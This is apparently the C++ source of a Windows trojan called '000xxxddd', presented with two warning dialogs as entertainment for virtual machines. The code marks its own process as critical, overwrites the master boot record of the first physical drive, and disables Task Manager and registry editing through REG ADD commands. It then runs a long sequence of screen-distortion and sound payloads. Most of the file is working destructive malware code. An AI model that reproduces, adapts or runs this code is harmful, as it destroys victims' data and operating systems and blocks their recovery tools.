// 000xxxddd.cpp : Defines the entry point for the application.
//

//#include"resource.h"
#include "def.h"
#include "sound.h"
#include "payload.h"
#include "noskid.h"
#include "goodmal2are.h"

//fuckyoun17pro3426
//67 This Is Good Malware 67

#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4715)

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 4096, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI noskid(LPVOID lpParam)
{
	CreateDirectoryA("C:\\67THISISNOSKID67", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\67THISISNOSKID67\\riplockjaw2025to2025.wmv", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, HorseVid, 228159, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);
	ShellExecute(0, 0, L"C:\\67THISISNOSKID67\\riplockjaw2025to2025.wmv", 0, 0, SW_SHOW);
	return 0;
}
void mainpayloads() {
	ProcessIsCritical();
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, noskid, 0, 0, 0);
	Sleep(7000);
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f");

	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	HANDLE thread1dot1 = CreateThread(0, 0, stretchbltz, 0, 0, 0);
	sound1();
	Sleep(30000);
	TerminateThread(thread1, 0);
	TerminateThread(thread1dot1, 0);
	InvalidateRect(0, 0, 0);
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	HANDLE thread2dot1 = CreateThread(0, 0, ccccccccccccccccircle, 0, 0, 0);
	sound2();
	Sleep(30000);
	TerminateThread(thread2, 0);
	HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
	sound3();
	Sleep(30000);
	TerminateThread(thread3, 0);
	HANDLE thread4 = CreateThread(0, 0, meltin9, 0, 0, 0);
	sound4();
	Sleep(30000);
	TerminateThread(thread4, 0);
	HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
	HANDLE thread5dot1 = CreateThread(0, 0, circlez, 0, 0, 0);
	HANDLE thread5dot2 = CreateThread(0, 0, shader4num1, 0, 0, 0);
	sound5();
	Sleep(30000);
	TerminateThread(thread5, 0);
	TerminateThread(thread5dot2, 0);
	HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
	sound6();
	Sleep(30000);
	TerminateThread(thread6, 0);
	HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
	sound7();
	Sleep(30000);
	TerminateThread(thread7, 0);
	HANDLE thread8 = CreateThread(0, 0, Tunnel, 0, 0, 0);
	HANDLE thread8dot1 = CreateThread(0, 0, idk, 0, 0, 0);
	sound8();
	Sleep(30000);
	TerminateThread(thread8, 0);
	TerminateThread(thread8dot1, 0);
	HANDLE thread9 = CreateThread(0, 0, g1itch, 0, 0, 0);
	HANDLE thread9dot1 = CreateThread(0, 0, texts, 0, 0, 0);
	HANDLE thread9dot2 = CreateThread(0, 0, specialtunnel, 0, 0, 0);
	sound9();
	Sleep(30000);
	TerminateThread(thread9, 0);
	TerminateThread(thread9dot2, 0);
	HANDLE thread10 = CreateThread(0, 0, shitfuck, 0, 0, 0);
	sound10();
	Sleep(30000);
	TerminateThread(thread10, 0);
	HANDLE thread11 = CreateThread(0, 0, shader7, 0, 0, 0);
	sound11();
	Sleep(30000);
	TerminateThread(thread11, 0);
	HANDLE thread12 = CreateThread(0, 0, enlarge, 0, 0, 0);
	sound12();
	Sleep(30000);
	TerminateThread(thread12, 0);
	HANDLE thread13 = CreateThread(0, 0, shader8, 0, 0, 0);
	sound13();
	Sleep(30000);
	TerminateThread(thread13, 0);
	HANDLE thread14 = CreateThread(0, 0, shader9, 0, 0, 0);
	sound14();
	Sleep(30000);
	TerminateThread(thread14, 0);
	HANDLE thread15 = CreateThread(0, 0, shader10, 0, 0, 0);
	sound15();
	Sleep(30000);
	TerminateThread(thread15, 0);
	HANDLE thread16 = CreateThread(0, 0, shader11, 0, 0, 0);
	sound16();
	Sleep(30000);
	TerminateThread(thread16, 0);
	HANDLE thread17 = CreateThread(0, 0, freeeeeeeeeeeeeze, 0, 0, 0);
	sound17();
	Sleep(30000);
	TerminateThread(thread17, 0);
	HANDLE thread18 = CreateThread(0, 0, shader12, 0, 0, 0);
	sound18();
	Sleep(30000);
	TerminateThread(thread18, 0);
	HANDLE thread19 = CreateThread(0, 0, invcc, 0, 0, 0);
	sound19();
	Sleep(30000);
	TerminateThread(thread19, 0);
	TerminateThread(thread2dot1, 0);
	TerminateThread(thread5dot1, 0);
	TerminateThread(thread9dot1, 0);
	ExitProcess(0);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as 000xxxddd that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"000xxxddd By MazeIcon & Jeremiah (NO SKID)", MB_YESNO | MB_ICONERROR) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator (MazeIcon & Jeremiah) will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"000xxxddd By MazeIcon & Jeremiah (NO SKID)", MB_YESNO | MB_ICONERROR) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			mainpayloads();
		}
	}
	return 0;
}